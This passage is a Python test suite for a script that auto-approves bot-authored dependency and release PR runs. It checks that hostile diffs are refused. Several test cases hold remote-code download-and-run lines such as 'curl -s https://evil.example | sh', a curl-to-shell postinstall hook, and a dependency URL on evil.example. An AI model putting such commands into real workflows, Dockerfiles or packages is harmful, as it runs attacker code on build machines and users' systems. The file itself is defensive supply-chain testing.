"""Offline tests for scripts/approve_bot_runs.py: fixture JSON, no network, stdlib only.

    python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import contextlib
import copy
import io
import json
import sys
import unittest
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import approve_bot_runs as abr  # noqa: E402

FIXTURE = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_valid.json").read_text())
PATCHES = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_patches.json").read_text())["cases"]


class FakeApi:
    """Serves the fixture; fails the test on any request the fixture does not describe."""

    def __init__(self, fx: dict[str, Any]):
        self.fx = fx

    def repo(self, full_name: str) -> dict[str, Any]:
        if full_name == self.fx["target"]:
            return self.fx["target_repo"]
        assert full_name in self.fx["org_repos"], full_name
        return self.fx["org_repos"][full_name]

    def repo_by_id(self, repo_id: int) -> dict[str, Any]:
        assert repo_id == self.fx["head_repo"]["id"], repo_id
        return self.fx["head_repo"]

    def pull(self, full_name: str, number: int) -> dict[str, Any]:
        return next(p for p in self.fx["pulls"] if p["number"] == number)

    def open_pulls_from(self, full_name: str, head_owner: str, head_branch: str) -> list[dict[str, Any]]:
        assert head_owner == abr.BOT_LOGIN
        return [p for p in self.fx["pulls"] if p["head"]["ref"] == head_branch]

    def pull_files(self, full_name: str, number: int) -> list[dict[str, Any]]:
        return self.fx["files"]

    def compare_status(self, full_name: str, base: str, head: str) -> str:
        return compare(self.fx["compares"], full_name, base, head)


NOT_FOUND = 404  # a compares value meaning GitHub answered 404 (no common history)


def compare(compares: dict[str, Any], full_name: str, base: str, head: str) -> str:
    key = f"{full_name} {base}...{head}"
    assert key in compares, f"unexpected compare: {key}"
    if compares[key] == NOT_FOUND:
        raise abr.GhError(f"gh api repos/{full_name}/compare/{base}...{head}: Not Found (HTTP 404)")
    return compares[key]


def decide(fx: dict[str, Any]) -> abr.Decision:
    return abr.decide(fx["target"], fx["run"], FakeApi(fx))


class DecideTest(unittest.TestCase):
    def setUp(self) -> None:
        self.fx = copy.deepcopy(FIXTURE)

    def assertSkip(self, fragment: str) -> None:
        d = decide(self.fx)
        self.assertFalse(d.approve, d.reason)
        self.assertIn(fragment, d.reason)

    def test_valid_bot_run_approves(self) -> None:
        d = decide(self.fx)
        self.assertTrue(d.approve, d.reason)
        self.assertEqual(d.pr, 190)

    def test_linked_pull_requests_path_approves(self) -> None:
        self.fx["run"]["pull_requests"] = [{"number": 190, "base": {"repo": {"id": 1000}}}]
        self.assertTrue(decide(self.fx).approve)

    def test_bot_actor_but_pr_author_is_someone_else(self) -> None:
        self.fx["pulls"][0]["user"] = {"login": "mallory", "id": 42, "type": "User"}
        self.assertSkip("PR author id 42")

    def test_pr_author_bot_login_but_type_bot(self) -> None:
        self.fx["pulls"][0]["user"]["type"] = "Bot"
        self.assertSkip("PR author type")

    def test_head_repo_not_a_fork_of_target(self) -> None:
        self.fx["head_repo"]["parent"] = {"id": 9, "full_name": "unified-systems-com/tap"}
        self.assertSkip("not a fork of the target")

    def test_head_repo_not_a_fork_at_all(self) -> None:
        self.fx["run"]["head_repository"]["fork"] = False
        self.assertSkip("not a fork")

    def test_head_sha_mismatch(self) -> None:
        self.fx["pulls"][0]["head"]["sha"] = "b" * 40
        self.assertSkip("head sha differs")

    def test_disallowed_file(self) -> None:
        self.fx["files"].append({"filename": "scripts/evil.sh", "status": "modified"})
        self.fx["pulls"][0]["changed_files"] = 4
        self.assertSkip("not on the allowlist: scripts/evil.sh")

    def test_login_match_with_wrong_id(self) -> None:
        self.fx["run"]["actor"] = {"login": abr.BOT_LOGIN, "id": 1, "type": "User"}
        self.assertSkip("actor id 1")

    def test_triggering_actor_not_bot(self) -> None:
        self.fx["run"]["triggering_actor"]["id"] = 286052
        self.assertSkip("triggering actor")

    def test_head_repo_owner_login_match_wrong_id(self) -> None:
        self.fx["run"]["head_repository"]["owner"]["id"] = 7
        self.assertSkip("not owned by the fork bot")

    def test_not_waiting_for_approval(self) -> None:
        self.fx["run"]["conclusion"] = "success"
        self.assertSkip("not waiting for approval")

    def test_event_not_pull_request(self) -> None:
        self.fx["run"]["event"] = "pull_request_target"
        self.assertSkip("not pull_request")

    def test_base_not_default_branch(self) -> None:
        self.fx["pulls"][0]["base"]["ref"] = "release"
        self.assertSkip("not the default branch")

    def test_zero_or_two_open_prs(self) -> None:
        self.fx["pulls"] = []
        self.assertSkip("0 open PRs")
        self.fx = copy.deepcopy(FIXTURE)
        self.fx["pulls"].append(copy.deepcopy(self.fx["pulls"][0]) | {"number": 191})
        self.assertSkip("2 open PRs")

    def test_removed_or_renamed_file(self) -> None:
        self.fx["files"][0]["status"] = "removed"
        self.assertSkip("status 'removed'")
        self.fx["files"][0].update(status="renamed", previous_filename="scripts/x.sh")
        self.assertSkip("status 'renamed'")

    def test_added_workflow_file(self) -> None:
        self.fx["files"][0]["status"] = "added"
        self.assertSkip("adds a workflow file")

    def test_nested_workflow_dir_not_allowed(self) -> None:
        self.fx["files"][0]["filename"] = ".github/workflows/sub/ci.yml"
        self.assertSkip("not on the allowlist")

    def test_too_many_files(self) -> None:
        self.fx["files"] = [{"filename": f"boot/{i}.boot.json", "status": "modified"} for i in range(51)]
        self.fx["pulls"][0]["changed_files"] = 51
        self.assertSkip("51 changed files")

    def test_file_list_shorter_than_changed_files(self) -> None:
        self.fx["pulls"][0]["changed_files"] = 4
        self.assertSkip("changed_files=4")


class AllowlistTest(unittest.TestCase):
    def test_paths(self) -> None:
        ok = [".github/workflows/ci.yml", ".github/workflows/a.yaml", "pyproject.toml", "uv.lock",
              "package.json", "package-lock.json", "boot/dev.boot.json", "x.boot.json",
              "tap-plugin.toml", "pkg/tap-plugin.toml", "CHANGELOG.md", ".release-please-manifest.json",
              "release-please-config.json", ".env", "Dockerfile", "renovate.json5",
              ".github/actions/a/action.yml", "docker/postgres/Dockerfile"]
        bad = ["scripts/evil.sh", ".github/workflows/x/ci.yml", ".github/actions/a/b/action.yml",
               ".github/actions/action.yml", ".github/actions/a/action.yaml", ".github/actions/a/run.sh",
               "sub/pyproject.toml", "docker/Dockerfile", "docker/postgres/Dockerfile.bak",
               "docker/web/Dockerfile", ".envrc", "uv.lock.bak", "src/CHANGELOG.md"]
        for p in ok:
            self.assertTrue(abr.path_allowed(p), p)
        for p in bad:
            self.assertFalse(abr.path_allowed(p), p)


class ArgsTest(unittest.TestCase):
    def test_default_is_dry_run(self) -> None:
        self.assertFalse(abr.parse_args([]).yes)
        self.assertFalse(abr.parse_args(["--repo", "tap"]).yes)
        self.assertFalse(abr.parse_args(["--dry-run"]).yes)
        self.assertTrue(abr.parse_args(["--yes"]).yes)


def org_repo(name: str, topics: tuple[str, ...] = ("tap-plugin",), owner: str = "unified-systems-com", **kw: Any) -> dict[str, Any]:
    """One entry of `GET /orgs/{org}/repos`, in the fields discovery reads."""
    return {"name": name, "full_name": f"{owner}/{name}", "owner": {"login": owner}, "topics": list(topics),
            "archived": False, "disabled": False, **kw}


def pages(repos: list[dict[str, Any]]) -> Any:
    """A get_page over a fake org repository list, split into PER_PAGE pages."""
    per = abr.discover_fleet.PER_PAGE

    def get_page(n: int) -> list[dict[str, Any]]:
        return repos[(n - 1) * per : n * per]

    return get_page


class RunsOnly:
    """The two calls main() makes itself: no run is waiting anywhere; approving is a test failure."""

    def __init__(self) -> None:
        self.listed: list[str] = []

    def waiting_runs(self, full_name: str) -> list[dict[str, Any]]:
        self.listed.append(full_name)
        return []

    def approve(self, full_name: str, run_id: int) -> None:
        raise AssertionError("nothing may be approved")


class FleetTest(unittest.TestCase):
    """The target list comes from discovery (scripts/discover_fleet.py), never from a file."""

    REPOS = [org_repo("a-tap"), org_repo("tap-plugin-b"), org_repo("untagged", topics=())]

    def run_main(self, argv: list[str], repos: list[dict[str, Any]]) -> tuple[int, list[str]]:
        api = RunsOnly()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            rc = abr.main(argv, get_page=pages(repos), api=api)
        return rc, api.listed

    def test_whole_fleet_is_discovered_plus_tap(self) -> None:
        rc, listed = self.run_main([], self.REPOS)
        self.assertEqual(rc, 0)
        self.assertEqual(listed, ["unified-systems-com/a-tap", "unified-systems-com/tap-plugin-b", "unified-systems-com/tap"])

    def test_repo_in_fleet(self) -> None:
        self.assertEqual(self.run_main(["--repo", "a-tap"], self.REPOS), (0, ["unified-systems-com/a-tap"]))
        self.assertEqual(self.run_main(["--repo", "unified-systems-com/tap"], self.REPOS), (0, ["unified-systems-com/tap"]))

    def test_repo_without_topic_refused(self) -> None:
        self.assertEqual(self.run_main(["--repo", "untagged"], self.REPOS), (2, []))

    def test_repo_org_bots_refused(self) -> None:
        self.assertEqual(self.run_main(["--repo", "org-bots"], self.REPOS), (2, []))

    def test_repo_foreign_owner_refused(self) -> None:
        repos = [*self.REPOS, org_repo("evil-tap", owner="someone-else")]
        self.assertEqual(self.run_main(["--repo", "evil-tap"], repos), (2, []))
        self.assertEqual(self.run_main(["--repo", "someone-else/evil-tap"], repos), (2, []))

    def test_org_bots_tagged_stops_everything(self) -> None:
        self.assertEqual(self.run_main([], [*self.REPOS, org_repo("org-bots")]), (2, []))

    def test_zero_repos_fails(self) -> None:
        self.assertEqual(self.run_main([], [org_repo("untagged", topics=())]), (2, []))

    def test_archived_not_in_fleet(self) -> None:
        repos = [*self.REPOS, org_repo("old-tap", archived=True)]
        self.assertEqual(self.run_main(["--repo", "old-tap"], repos), (2, []))

    def test_listing_error_fails(self) -> None:
        def broken(n: int) -> Any:
            raise abr.discover_fleet.DiscoveryError("boom")

        api = RunsOnly()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(abr.main([], get_page=broken, api=api), 2)
        self.assertEqual(api.listed, [])

    def test_select_targets(self) -> None:
        fleet = ["a", "tap"]
        self.assertEqual(abr.select_targets(fleet, []), fleet)
        self.assertEqual(abr.select_targets(fleet, ["a", "a"]), ["a"])
        self.assertIsInstance(abr.select_targets(fleet, ["a", "b"]), str)


OLD_SHA = "1ffb2417032350ec1d31f0af400c25b225ee66ca"
NEW_SHA = "57505751b27900e5d58fc0c2b40df32f18a2b980"
CI_USES = "    uses: unified-systems-com/tap/.github/workflows/plugin-ci.yml@"


def case(name: str) -> list[dict[str, Any]]:
    return copy.deepcopy(PATCHES[name]["files"])


def check(files: list[dict[str, Any]]) -> str | None:
    return abr.check_files(files, len(files))


def patch_of(files: list[dict[str, Any]], filename: str) -> dict[str, Any]:
    return next(f for f in files if f["filename"] == filename)


def edit(files: list[dict[str, Any]], filename: str, old: str, new: str) -> list[dict[str, Any]]:
    f = patch_of(files, filename)
    assert old in f["patch"], (filename, old)
    f["patch"] = f["patch"].replace(old, new, 1)
    return files


def one_file(filename: str, patch: str, status: str = "modified") -> list[dict[str, Any]]:
    return [{"filename": filename, "status": status, "patch": patch}]


class RealShapesTest(unittest.TestCase):
    """Every shape here is a real merged bot PR's diff (the fixture names each PR)."""

    APPROVED = ("workflow_sha_bump", "workflow_long_comment", "workflow_main_pin", "workflow_main_pin_comment",
                "workflow_tag_to_sha", "workflow_version_comment", "boot_commit", "dockerfile_digest",
                "dockerfile_copy_from", "dockerfile_tag", "package_json", "pyproject_deps", "release_plugin")

    def test_real_bot_diffs_pass(self) -> None:
        for name in self.APPROVED:
            with self.subTest(name):
                self.assertIsNone(check(case(name)))

    def test_real_release_prs_with_uv_lock_pass(self) -> None:
        for name in ("release_tap", "release_tap760", "release_tap679", "release_tap344", "release_tap50", "release_tap38"):
            with self.subTest(name):
                self.assertIn("uv.lock", [f["filename"] for f in case(name)])
                self.assertIsNone(check(case(name)))

    def test_real_postgres_dockerfile_prs_pass(self) -> None:
        names = [n for n in PATCHES if n.startswith("postgres_dockerfile_")]
        self.assertEqual(len(names), 15)
        for name in names:
            with self.subTest(name):
                self.assertIn("docker/postgres/Dockerfile", [f["filename"] for f in case(name)])
                self.assertIsNone(check(case(name)))

    def test_real_composite_action_prs_pass(self) -> None:
        names = [n for n in PATCHES if n.startswith("action_yml_")]
        self.assertEqual(len(names), 3)
        for name in names:
            with self.subTest(name):
                self.assertIn(".github/actions/ci-web-image/action.yml", [f["filename"] for f in case(name)])
                self.assertIsNone(check(case(name)))
                self.assertEqual(abr.org_pins(case(name)), [])  # third-party actions only

    def test_real_release_pr_without_uv_lock_passes(self) -> None:
        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
        self.assertIsNone(check(files))

    def test_real_tag_to_tag_bump_refused(self) -> None:
        self.assertIn("not moved to a 40-hex commit sha", check(case("workflow_tag_to_tag")) or "")

    def test_whole_decision_with_real_patches_approves(self) -> None:
        fx = copy.deepcopy(FIXTURE)
        fx["files"] = case("workflow_main_pin")
        self.assertTrue(decide(fx).approve)


class HostileContentTest(unittest.TestCase):
    """Each case is a real bot diff with one hostile edit; every one must be refused."""

    def assertRefused(self, files: list[dict[str, Any]], fragment: str) -> None:
        why = check(files)
        self.assertIsNotNone(why, "hostile diff passed")
        self.assertIn(fragment, why or "")

    def test_workflow_extra_run_line(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}{NEW_SHA}\n", f"+{CI_USES}{NEW_SHA}\n+    run: curl -s https://evil.example | sh\n")
        self.assertRefused(files, "1 lines removed but 2 added")

    def test_workflow_run_line_rewritten(self) -> None:
        files = one_file(".github/workflows/ci.yml",
                         "@@ -5,3 +5,3 @@ jobs:\n     steps:\n-      - run: make test\n+      - run: curl evil | sh\n")
        self.assertRefused(files, "not a `uses:` line")

    def test_workflow_uses_other_action(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}", "+    uses: mallory/tap/.github/workflows/plugin-ci.yml@")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_uses_other_file_in_same_repo(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     f"+{CI_USES}", "+    uses: unified-systems-com/tap/.github/workflows/evil.yml@")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_new_ref_is_a_tag(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}v9.9.9")
        self.assertRefused(files, "not moved to a 40-hex commit sha")

    def test_workflow_new_ref_is_a_short_sha(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}{NEW_SHA[:12]}")
        self.assertRefused(files, "not moved to a 40-hex commit sha")

    def test_workflow_permissions_change(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
                     "       contents: read\n", "-      contents: read\n+      contents: write\n")
        self.assertRefused(files, "not a `uses:` line")

    def test_workflow_indentation_change(self) -> None:
        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}", f"+  {CI_USES}")
        self.assertRefused(files, "changes more than its ref")

    def test_workflow_text_after_comment_changes(self) -> None:
        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
                     "# v7   # for .trivyignore", "# v7   # for .trivyignore\n+        run: curl evil")
        self.assertIsNotNone(check(files))
        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
                     "# v7   # for .trivyignore", "# v7   # something else")
        self.assertRefused(files, "trailing text changes beyond a version comment")

    def test_workflow_only_added_line(self) -> None:
        files = one_file(".github/workflows/ci.yml",
                         f"@@ -5,2 +5,3 @@ jobs:\n {CI_USES}{OLD_SHA}\n+    secrets: inherit\n     with:\n")
        self.assertRefused(files, "0 lines removed but 1 added")

    def test_package_json_postinstall_added(self) -> None:
        files = edit(case("package_json"), "package.json",
                     '   "private": true,\n', '   "private": true,\n+  "scripts": {"postinstall": "curl evil | sh"},\n')
        self.assertRefused(files, "0 lines removed but 1 added")

    def test_package_json_change_inside_scripts(self) -> None:
        files = one_file("package.json",
                         '@@ -2,5 +2,5 @@\n   "name": "x",\n   "scripts": {\n-    "build": "1.0.0",\n+    "build": "1.0.1",\n'
                         '     "test": "node t.js"\n')
        self.assertRefused(files, "outside the dependency sections")

    def test_package_json_dependency_to_a_git_url(self) -> None:
        files = edit(case("package_json"), "package.json", '+    "cytoscape": "3.34.2",', '+    "cytoscape": "github:mallory/cytoscape",')
        self.assertRefused(files, "not moved to a version")

    def test_dockerfile_run_change(self) -> None:
        files = one_file("Dockerfile", "@@ -10,3 +10,3 @@\n FROM x AS y\n-RUN apk add curl\n+RUN curl evil | sh\n")
        self.assertRefused(files, "not a `FROM` or `COPY --from=` image line")

    def test_dockerfile_from_switches_image(self) -> None:
        files = edit(case("dockerfile_digest"), "Dockerfile",
                     "+FROM cgr.dev/chainguard/wolfi-base:latest@", "+FROM docker.io/mallory/wolfi-base:latest@")
        self.assertRefused(files, "changes its image, stage name or arguments")

    def test_dockerfile_from_renames_stage(self) -> None:
        files = case("dockerfile_digest")
        f = patch_of(files, "Dockerfile")
        lines = f["patch"].split("\n")
        i = next(n for n, line in enumerate(lines) if line.startswith("+FROM"))
        lines[i] = lines[i].replace(" AS ossl-builder", " AS base")
        f["patch"] = "\n".join(lines)
        self.assertRefused(files, "changes its image, stage name or arguments")

    def test_dockerfile_digest_dropped(self) -> None:
        files = one_file("Dockerfile", "@@ -1,1 +1,1 @@\n-FROM node:22-alpine@sha256:" + "a" * 64 + " AS js\n+FROM node:24-alpine AS js\n")
        self.assertRefused(files, "not pinned by a sha256 digest")

    def test_boot_record_url_change(self) -> None:
        url = '          "url": "https://github.com/unified-systems-com/tap-plugin-compliance-core",'
        files = one_file("boot/core_ci.boot.json",
                         f"@@ -65,1 +65,1 @@\n-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
        self.assertRefused(files, "`url` changes")
        files = edit(case("boot_commit"), "boot/core_ci.boot.json", f" {url}\n",
                     f"-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
        self.assertIsNotNone(check(files))

    def test_boot_record_commit_not_a_sha(self) -> None:
        files = edit(case("boot_commit"), "boot/core_ci.boot.json",
                     '+          "commit": "e5464e4dd87758d41552d45df42c0303b0de48e3"', '+          "commit": "main"')
        self.assertRefused(files, "not a 40-hex sha")

    def test_env_other_key(self) -> None:
        files = edit(case("release_tap"), ".env", "-TAP_VERSION=0.1.2 # x-release-please-version\n+TAP_VERSION=0.1.3",
                     "-TAP_WEB_IMAGE=ghcr.io/x\n+TAP_WEB_IMAGE=ghcr.io/mallory/x\n TAP_VERSION=0.1.2")
        self.assertRefused(files, "not a value-only `TAP_VERSION=` move")

    def test_env_version_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_tap"), ".env")]
        self.assertRefused(files, "outside a release-please PR")

    def test_release_file_version_differs_from_manifest(self) -> None:
        files = edit(case("release_plugin"), "tap_plugin/github_core/tap-plugin.toml",
                     '+plugin_version = "0.12.2"', '+plugin_version = "9.9.9"')
        self.assertRefused(files, "does not match the release manifest")

    def test_missing_patch(self) -> None:
        files = case("workflow_sha_bump")
        del files[1]["patch"]
        self.assertRefused(files, "no diff from GitHub for .github/workflows/nightly.yml")

    def test_uv_lock_touched(self) -> None:
        files = case("pyproject_deps") + [{"filename": "uv.lock", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}]
        self.assertRefused(files, "needs a human look: uv.lock")

    def test_other_allowlisted_paths_need_a_human(self) -> None:
        for name in ("package-lock.json", "renovate.json5", "release-please-config.json"):
            with self.subTest(name):
                self.assertRefused(one_file(name, "@@ -1 +1 @@\n-a\n+b"), f"needs a human look: {name}")

    def test_changelog_with_removed_lines(self) -> None:
        files = edit(case("release_tap"), "CHANGELOG.md", " # Changelog\n", "-# Changelog\n")
        files = [f for f in files if f["filename"] != "uv.lock"]
        self.assertRefused(files, "CHANGELOG.md has removed lines")

    def test_changelog_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_plugin"), "CHANGELOG.md")]
        self.assertRefused(files, "CHANGELOG.md changes outside a release-please PR")

    def test_changelog_below_the_top(self) -> None:
        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
        f = patch_of(files, "CHANGELOG.md")
        f["patch"] = "@@ -40,3 +40,4 @@\n x\n+* sneaky\n y\n"
        self.assertRefused(files, "changed below its top")

    def test_manifest_not_a_version(self) -> None:
        files = edit(case("release_plugin"), ".release-please-manifest.json", '+  ".": "0.12.2"', '+  ".": "latest"')
        self.assertRefused(files, "not a version")

    def test_plugin_manifest_other_key(self) -> None:
        files = one_file("tap_plugin/x/tap-plugin.toml", '@@ -3,1 +3,1 @@\n-requires_tap = ">=0.2.1"\n+requires_tap = ">=0.0.0"\n')
        self.assertRefused(files, "`requires_tap` changes")

    def test_plugin_manifest_sha256_with_its_boot_record(self) -> None:
        # Shape of duo-tap's [[boot.records]] digest line; no bot PR has changed one yet.
        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("tap_plugin/duo/boot/ci.boot.json", DUO_BOOT_PATCH)
        self.assertIsNone(check(files))
        files[0]["patch"] = SHA256_PATCH.replace("c" * 64, "c" * 63)
        self.assertRefused(files, "not 64 hex")

    def test_plugin_manifest_lone_sha256_refused(self) -> None:
        self.assertRefused(one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH), "no boot record changed in the same")

    def test_plugin_manifest_sha256_with_another_packages_boot_record(self) -> None:
        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("tap_plugin/okta/boot/ci.boot.json", DUO_BOOT_PATCH)
        self.assertRefused(files, "no boot record changed in the same")
        files = one_file("tap_plugin/duo/tap-plugin.toml", SHA256_PATCH) + one_file("boot/ci.boot.json", DUO_BOOT_PATCH)
        self.assertRefused(files, "no boot record changed in the same")
        # A manifest outside any tap_plugin/<slug>/ package has no package to match.
        files = one_file("tap-plugin.toml", SHA256_PATCH) + one_file("boot/ci.boot.json", DUO_BOOT_PATCH)
        self.assertRefused(files, "no boot record changed in the same")

    def test_added_composite_action(self) -> None:
        files = one_file(".github/actions/x/action.yml", "@@ -0,0 +1,1 @@\n+runs: {using: composite}\n", status="added")
        self.assertRefused(files, "adds a composite action")
        files = case("action_yml_tap488")
        patch_of(files, ".github/actions/ci-web-image/action.yml")["status"] = "added"
        self.assertRefused(files, "adds a composite action")

    def test_composite_action_run_line(self) -> None:
        files = edit(case("action_yml_tap488"), ".github/actions/ci-web-image/action.yml",
                     "       if: steps.decide.outputs.mode == 'build'\n-      uses:",
                     "       if: steps.decide.outputs.mode == 'build'\n+      run: curl evil | sh\n-      uses:")
        self.assertRefused(files, "removed and added lines interleave")
        files = one_file(".github/actions/ci-web-image/action.yml", "@@ -40,1 +40,1 @@\n-      run: make\n+      run: curl evil | sh\n")
        self.assertRefused(files, "not a `uses:` line")

    def test_postgres_dockerfile_run_change(self) -> None:
        files = one_file("docker/postgres/Dockerfile", "@@ -10,3 +10,3 @@\n FROM x AS y\n-RUN apk add curl\n+RUN curl evil | sh\n")
        self.assertRefused(files, "not a `FROM` or `COPY --from=` image line")
        files = edit(case("postgres_dockerfile_tap837"), "docker/postgres/Dockerfile",
                     "+FROM cgr.dev/chainguard/wolfi-base:latest@", "+FROM docker.io/mallory/wolfi-base:latest@")
        self.assertRefused(files, "changes its image, stage name or arguments")

    # uv.lock: only tap's own version line, in a release PR, to the manifest's version.

    def test_uv_lock_second_changed_line(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", ' dependencies = [\n     { name = "croniter" },',
                     ' dependencies = [\n-    { name = "croniter" },\n+    { name = "evil" },')
        self.assertRefused(files, "needs a human look: uv.lock (not one version line)")

    def test_uv_lock_second_hunk(self) -> None:
        files = case("release_tap760")
        f = patch_of(files, "uv.lock")
        f["patch"] += '\n@@ -2000,1 +2000,1 @@\n-version = "1.0.0"\n+version = "0.2.2"'
        self.assertRefused(files, "needs a human look: uv.lock (not one version line)")

    def test_uv_lock_other_package(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", ' name = "tap"\n', ' name = "croniter"\n')
        self.assertRefused(files, "not the project's own package")

    def test_uv_lock_not_virtual_source(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", ' source = { virtual = "." }',
                     ' source = { registry = "https://pypi.org/simple" }')
        self.assertRefused(files, "virtual")

    def test_uv_lock_version_not_the_manifests(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", '+version = "0.2.2"', '+version = "0.2.3"')
        self.assertRefused(files, "does not match the release manifest")

    def test_uv_lock_block_not_visible(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", " \n [[package]]\n", " \n")
        self.assertRefused(files, "`[[package]]` block is not visible")

    def test_uv_lock_project_name_not_visible(self) -> None:
        files = edit(case("release_tap760"), "pyproject.toml", ' name = "tap"\n', ' description = "x"\n')
        self.assertRefused(files, "project name is not visible")

    def test_uv_lock_changed_line_not_a_version(self) -> None:
        files = edit(case("release_tap760"), "uv.lock", '-version = "0.2.1"\n+version = "0.2.2"',
                     '-version = "0.2.1"\n+version = "0.2.2" # x')
        self.assertRefused(files, "the changed line is not a `version`")

    def test_pyproject_dependency_renamed(self) -> None:
        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "rufff>=0.16,<0.17",')
        self.assertRefused(files, "changes more than its version specifier")

    def test_pyproject_url_dependency(self) -> None:
        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "ruff @ https://evil.example/r.whl",')
        self.assertRefused(files, "not a version specifier")

    def test_pyproject_version_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_tap"), "pyproject.toml")]
        self.assertRefused(files, "outside a release-please PR")

    def test_uv_lock_outside_a_release_pr(self) -> None:
        files = [patch_of(case("release_tap760"), "uv.lock")]
        self.assertRefused(files, "needs a human look: uv.lock")

    def test_whole_decision_refuses_hostile_workflow(self) -> None:
        fx = copy.deepcopy(FIXTURE)
        fx["files"] = edit(fx["files"], ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}\n",
                           f"+{CI_USES}{NEW_SHA}\n+    run: curl evil | sh\n")
        d = decide(fx)
        self.assertFalse(d.approve)
        self.assertIn(".github/workflows/ci.yml", d.reason)


SHA256_PATCH = '@@ -55,1 +55,1 @@\n-sha256 = "' + "b" * 64 + '"\n+sha256 = "' + "c" * 64 + '"\n'
# duo-tap's ci.boot.json entry for identity_core, its `commit` moved (the shape of the real
# boot-record moves in RealShapesTest.boot_commit).
DUO_BOOT_PATCH = (
    '@@ -9,7 +9,7 @@\n         "source": {\n           "type": "git",\n'
    '           "url": "https://github.com/unified-systems-com/tap-plugin-identity-core",\n'
    '-          "commit": "53da388b6f47590090ef3bdc8d98731acff4c8e2"\n'
    '+          "commit": "63da037c77355369f91748127a74c7a17e00a7f9"\n'
    '         },\n'
)

COMPLIANCE = "unified-systems-com/tap-plugin-compliance-core"
GITHUB_CORE = "unified-systems-com/tap-plugin-github-core"
# tap#647's two boot-record commits (both release tags' commits; live compare `ahead`, 2026-09-27).
COMPLIANCE_SHA = "e5464e4dd87758d41552d45df42c0303b0de48e3"
GITHUB_CORE_SHA = "d157f3f1d457b44dbb44d46c5944578d3f221a1b"


class PinApi:
    """Serves repos/{repo} (default branch main) and the compares it is given; any other
    request fails the test."""

    def __init__(self, compares: dict[str, Any], repos: dict[str, dict[str, Any]] | None = None):
        self.compares, self.repos, self.calls = compares, repos or {}, []

    def repo(self, full_name: str) -> dict[str, Any]:
        self.calls.append(("repo", full_name))
        if full_name in self.repos:
            if isinstance(self.repos[full_name], Exception):
                raise self.repos[full_name]
            return self.repos[full_name]
        return {"full_name": full_name, "default_branch": "main"}

    def compare_status(self, full_name: str, base: str, head: str) -> str:
        self.calls.append(("compare", full_name, base, head))
        return compare(self.compares, full_name, base, head)


def boot_compares(compliance: Any = "ahead", github_core: Any = "ahead") -> dict[str, Any]:
    return {f"{COMPLIANCE} {COMPLIANCE_SHA}...main": compliance, f"{GITHUB_CORE} {GITHUB_CORE_SHA}...main": github_core}


class ImpostorCommitTest(unittest.TestCase):
    """Every sha the PR pins in one of our repositories must be on its default branch."""

    def setUp(self) -> None:
        self.fx = copy.deepcopy(FIXTURE)
        self.key = "unified-systems-com/tap 57505751b27900e5d58fc0c2b40df32f18a2b980...main"

    def test_reachable_uses_sha_approves(self) -> None:
        for status in ("ahead", "identical"):
            with self.subTest(status):
                self.fx["compares"][self.key] = status
                self.assertTrue(decide(self.fx).approve)

    def test_impostor_uses_sha_refused(self) -> None:
        for status, fragment in (("diverged", "compare says diverged"), ("behind", "compare says behind"),
                                 (NOT_FOUND, "could not verify")):
            with self.subTest(status):
                self.fx["compares"][self.key] = status
                d = decide(self.fx)
                self.assertFalse(d.approve)
                self.assertIn(fragment, d.reason)
                self.assertIn("unified-systems-com/tap@57505751b279", d.reason)

    def test_uses_owner_in_other_case_still_checked(self) -> None:
        files = case("workflow_sha_bump")
        for f in files:
            f["patch"] = f["patch"].replace("unified-systems-com/tap/", "Unified-Systems-Com/tap/")
        self.assertIsNone(check(files))
        self.assertIn("compare says diverged", abr.check_pins(files, PinApi({f"unified-systems-com/tap {NEW_SHA}...main": "diverged"})) or "")

    def test_repo_lookup_error_refused(self) -> None:
        api = PinApi({}, {"unified-systems-com/tap": abr.GhError("HTTP 502")})
        self.assertIn("could not verify", abr.check_pins(case("workflow_sha_bump"), api) or "")

    def test_unreadable_default_branch_refused(self) -> None:
        for branch in ("", "../x", "a b"):
            with self.subTest(branch):
                api = PinApi({}, {"unified-systems-com/tap": {"default_branch": branch}})
